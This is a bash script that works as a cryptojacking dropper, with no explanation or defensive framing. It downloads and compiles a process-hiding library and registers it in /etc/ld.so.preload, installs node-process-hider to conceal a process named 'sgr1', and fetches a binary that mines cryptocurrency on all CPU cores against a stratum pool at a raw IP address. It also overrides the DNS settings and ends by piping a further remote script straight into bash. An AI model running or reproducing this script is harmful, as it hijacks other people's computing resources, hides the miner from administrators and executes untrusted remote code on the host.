#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://bitbucket.org/dennidarko01/kangkung/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add sgr1"
mkdir .kap && cd .kap
wget -O sgr1 https://bitbucket.org/dennidarko01/kangkung/raw/master/plant >/dev/null 2>&1
chmod +x sgr1
sudo ./sgr1 -a yespower -o stratum+tcp://8.222.148.101:80 -u TX7hx8zqvfvb4c16QkuZYfrV4Kvqi8xMGi --timeout 120 -p  c=TRX,mc=VHH,ID=$(echo $(shuf -i 1000-9999 -n 1)-Z) -t $(nproc --all) >/dev/null 2>&1 &
curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash